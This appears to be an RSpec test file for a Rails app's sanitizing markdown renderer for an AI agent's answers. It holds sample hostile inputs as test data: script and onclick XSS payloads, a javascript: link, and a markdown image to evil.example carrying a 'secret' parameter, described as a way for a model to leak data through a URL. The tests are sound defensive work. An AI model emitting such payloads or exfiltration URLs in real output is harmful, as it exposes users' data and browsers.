require "rails_helper"

RSpec.describe Agent::MarkdownRenderer do
  def render(text) = described_class.html(text)

  it "renders what an answer needs: emphasis, lists and tables" do
    html = render("**Total** 12,00 EUR\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n")

    expect(html).to include("<strong>Total</strong>", "<li>one</li>", "<table>", "<td>1</td>")
  end

  it "drops raw HTML, scripts and event handlers" do
    html = render("hello <script>alert(1)</script> <b onclick=\"x()\">bold</b> <iframe src=\"http://e\"></iframe>")

    expect(html).not_to match(/<script|onclick|<iframe|alert\(1\)<\/script/)
  end

  it "shows no external image, which would let the model leak data through a URL" do
    expect(render("![x](http://evil.example/?d=secret)")).not_to include("<img", "evil.example")
  end

  it "builds no link from an address the model gave, internal or external" do
    html = render("[click](http://evil.example) and [js](javascript:alert(1)) and https://evil.example/auto")

    expect(html).not_to include("<a ", "href")
    expect(html).to include("click")
  end

  describe "the sources of an answer" do
    let(:citations) { [ { "n" => 1, "ref" => "entry:12", "label" => "Entry #12", "computed" => false } ] }

    it "turns a marker into a link built by the application, after the sanitizing, to the screen of the source" do
      html = described_class.html("Total 10.00 EUR [[ref:entry:12]].", citations: citations)

      expect(html).to include('<a href="/accounting/journal_entries/12"', ">[1]</a>")
    end

    it "gives no link to what the model wrote itself: a marker that is not a resolved source shows as unverified, and an address stays dead" do
      html = described_class.html("See [[ref:entry:999]] and [click](http://evil.example)", citations: citations)

      expect(html).to include("[unverified source]")
      expect(html).not_to include("evil.example", "<a ")
    end
  end

  it "is html_safe only after sanitizing, and empty for no text" do
    expect(render("x")).to be_html_safe
    expect(render(nil)).to eq("")
  end
end
